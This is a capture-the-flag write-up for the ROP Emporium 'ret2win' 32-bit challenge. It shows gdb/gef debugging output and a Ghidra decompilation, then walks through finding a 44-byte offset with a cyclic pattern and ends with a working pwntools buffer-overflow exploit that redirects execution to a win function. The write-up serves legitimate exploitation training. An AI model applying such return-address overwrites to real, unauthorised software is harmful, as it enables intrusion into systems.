# ret2win (x86)

For the x86 version of the challenge, we can see that the program contains the following functions : 

```nasm
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
0x08048660  __libc_csu_init
0x080486c0  __libc_csu_fini
0x080486c4  _fini
```

We get a bunch of not-so-interesting functions, as well as a `main`, `pwnme` and `ret2win` function. They are used for the following : 

- `main (0x08048546)` : nothing much except calling for the pwnme function
- `pwnme (0x080485ad)` : get the user input
- `ret2win (0x0804862c)` : target, prints the flag

Here’s how the `pwnme` function looks in Ghidra : 

```c
void pwnme(void)

{
  undefined input [40];
  
  memset(input,0,0x20);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,input,0x38);
  puts("Thank you!");
  return;
}
```

Now, we know that we’ll have to overwrite the `eip` register in order to make it point to `0x0804862c`.

To find the offset, we can use a De Bruijn sequence in order to find the offset that we’ll have to pass to our program in order to overwrite that register. Let’s do it in gdb : 

```nasm
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
```

Now, we insert a breakpoint right after the `read` function, and pass our sequence to see how it looks on the stack. 

```nasm
gef➤  b *0x08048616
Breakpoint 1 at 0x8048616
gef➤  r
Starting program: /home/dalf/ctf/ctf-writeups/ropemporium/ret2win/ret2win32
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

With our input, the registers looks like this : 

```nasm
────────────────────────────────────────────────── registers ────────────────────────────────────────────────── 
$eax   : 0xb
$ebx   : 0xf7fab000  →  0x00229dac
$ecx   : 0xf7fac9b4  →  0x00000000
$edx   : 0x1
$esp   : 0xffffd460  →  0x6161616d ("maaa"?)
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0xffffd534  →  0xffffd687  →  "/home/dalf/ctf/ctf-writeups/ropemporium/ret2win/re[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
```

As we can see, our $eip was overwritten with the value `0x6161616c`. To find the offset, we can use the gef command `pattern offset` with the content of it (0x6161616c). 

```nasm
gef➤  pattern offset 0x6161616c
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```

We now have the info that we were looking for, the offset is 44 bytes away. Now we can build our exploit: 

```nasm
from pwn import *
target = process('./ret2win32')

payload = b""
payload += b"A"*44
payload += p32(0x0804862c)

target.sendline(payload)
target.interactive()
```

… and run it : 

```bash
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

VAMONOS